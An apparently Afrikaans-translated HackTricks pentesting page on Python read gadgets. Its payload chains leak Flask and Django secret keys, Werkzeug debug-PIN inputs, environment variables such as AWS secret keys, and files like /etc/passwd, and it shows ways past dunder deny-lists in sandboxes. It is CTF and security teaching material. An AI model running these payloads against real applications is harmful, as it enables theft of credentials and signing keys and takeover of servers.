# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}

## Basiese Inligting

Verskillende kwesbaarhede, soos [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) of [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), kan jou moontlik maak om **interne Python-data te lees, maar sal jou nie toelaat om code uit te voer nie**. Daarom sal ’n pentester hierdie leestoestemmings ten beste moet benut om **sensitiewe privileges te verkry en die kwesbaarheid te eskaleer**.

### Flask - Lees secret key

Die hoofblad van ’n Flask-toepassing sal waarskynlik die **`app`**-globale objek hê waar hierdie **secret geconfigureer is**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
In hierdie geval is dit moontlik om toegang tot hierdie objek te verkry deur enige gadget te gebruik om toegang tot **global objects** vanaf die [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html) te verkry.

In die geval waar **die vulnerability in ’n ander Python-lêer is**, het jy ’n gadget nodig om deur lêers te traverseer om by die hooflêer uit te kom, sodat jy toegang tot die global object `app.secret_key` kan verkry en [**privileges kan eskaleer** deur hierdie key te ken](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

’n Payload soos hierdie een [uit hierdie writeup](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Gebruik hierdie payload om **app.secret_key te lees**. As die oorspronklike bug jou ook ’n write primitive gee (byvoorbeeld class pollution), kan dieselfde pad gebruik word om dit te vervang en meer bevoorregte Flask-cookies te sign.

### Werkzeug - machine_id and node uuid

[**Deur hierdie payload uit hierdie writeup te gebruik**](https://vozec.fr/writeups/tweedle-dum-dee/) sal jy toegang tot die **machine_id** en die **uuid** node kry, wat die **private bits** is wat jy nodig het om die [**Werkzeug pin te genereer**](../../network-services-pentesting/pentesting-web/werkzeug.md) en toegang tot die Python-console in `/console` te verkry as die **debug mode geaktiveer** is:
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Let daarop dat jy die **server se plaaslike pad na `app.py`** kan kry deur ’n **error** op die webblad te genereer wat die **pad sal gee**.

As die vulnerability in ’n ander Python-lêer is, gebruik die vorige Flask-truuk om toegang tot die objekte vanuit die hoof-Python-lêer te kry.

### Django - SECRET_KEY en settings module

Die Django settings-objek word in `sys.modules` gecache sodra die toepassing begin. Met slegs read primitives kan jy die **`SECRET_KEY`**, fallback keys, database credentials of signing salts lek:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
As die kwesbare gadget in ’n ander module is, deurloop eers globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` is net so waardevol soos die huidige `SECRET_KEY`: hulle valideer steeds ou ondertekende waardes tydens rotasie. Lek ook `SESSION_ENGINE` en `SESSION_SERIALIZER` uit om vinnig te bepaal of die impak slegs cookie forgery is of iets sterker. Vir die besonderhede oor die webimpak, kyk na die [**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md).

### Module loader gadgets - lees bronkode en lêers

Gelade Python-modules behou gewoonlik ’n `__loader__`. Lêergebaseerde loaders stel dikwels `get_source()` en `get_data()` bloot, wat perfekte **lees-alleen-primitiewe** is wanneer jy reeds toegang tot ’n module-objek het, maar nie tot `open()` nie:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Dit is baie nuttig om **config modules, blueprints, helper files of hidden routes** te dump en API keys, DSNs, flag paths of additional gadget entry points te herwin.

As jy slegs subclass enumeration het, soek die loader volgens naam in plaas daarvan om ’n indeks hard-coded te gebruik:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Generator / coroutine frame globals

As jy ’n generator/coroutine-objek kan skep of bereik, kan sy frame globals uitlek **sonder dat enige funksie se `__globals__` gadget nodig is**. Dit is nuttig teen filters wat slegs dunder-name blokkeer en raamwerkattribute soos `gi_frame`, `ag_frame`, `cr_frame` of `f_globals` vergeet:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Sodra jy die frame globals het, gaan presies voort soos met die ander gadgets (`sys.modules`, settings objects, `os.environ`, ens.). Onlangse sandbox escapes ontdek dit telkens opnuut omdat `gi_frame` en `f_globals` nie dunder attributes is nie en dikwels naïewe deny-lists oorleef.

### Environment variables / cloud creds via loaded modules

Baie jails voer steeds êrens `os` of `sys` in. Jy kan enige bereikbare funksie se `__init__.__globals__` misbruik om na die reeds ingevoerde `os`-module te pivot en **environment variables** met API-tokens, cloud keys of flags uit te dump:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Indien die subclass-indeks gefiltreer word, gebruik loaders:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Omgewingsveranderlikes is dikwels die enigste secrets wat nodig is om van read na full compromise te beweeg (cloud IAM keys, database URLs, signing keys, ens.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`) het **class pollution** via vervaardigde component requests toegelaat. Deur ’n property path soos `__init__.__globals__` te stel, kon ’n aanvaller die component module globals en enige imported modules (bv. `settings`, `os`, `sys`) bereik. Van daar af kan jy `SECRET_KEY`, `DATABASES` of service credentials leak sonder code execution. Die exploit chain is suiwer read-based en gebruik dieselfde dunder-gadget-patrone as hierbo.

### Gadget collections vir chaining

Onlangse CTFs en pyjail-navorsing toon betroubare read chains wat slegs met attribute access en subclass enumeration gebou is. Community-maintained lists soos [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) katalogiseer honderde minimale gadgets wat jy kan kombineer om van objects na `__globals__`, `sys.modules` en uiteindelik sensitiewe data te beweeg. Verkies **attribute/name based searches** bo raw subclass indexes, omdat die posisie van `os._wrap_close`, `FileLoader`, `warnings.catch_warnings`, ens. tussen Python-weergawes en met ekstra imported libraries verander.

## Verwysings

- [Django cryptographic signing docs](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
